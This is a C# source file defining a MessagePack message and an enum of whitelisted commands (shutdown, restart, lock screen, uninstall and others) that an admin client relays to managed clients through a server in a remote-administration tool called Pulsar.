using MessagePack;
using Pulsar.Common.Messages.Other;

namespace Pulsar.Common.Messages.AdminRelay
{
    /// <summary>
    /// Commands an admin client can relay to a managed client through the server.
    /// </summary>
    public enum AdminRelayCommand
    {
        None = 0,
        Shutdown = 1,
        Restart = 2,
        Standby = 3,
        Lockscreen = 4,
        Reconnect = 5,
        Disconnect = 6,
        Uninstall = 7,
        MessageBox = 8,
        QuickCommand = 9
    }

    /// <summary>
    /// Asks the server to execute a whitelisted command on a managed client.
    /// The server validates the admin permission, resolves the target and forwards
    /// the equivalent regular message to it.
    /// </summary>
    [MessagePackObject]
    public class DoAdminRelay : IMessage
    {
        [Key(1)]
        public string TargetId { get; set; }

        [Key(2)]
        public AdminRelayCommand Command { get; set; }

        [Key(3)]
        public string Param1 { get; set; }

        [Key(4)]
        public string Param2 { get; set; }
    }
}
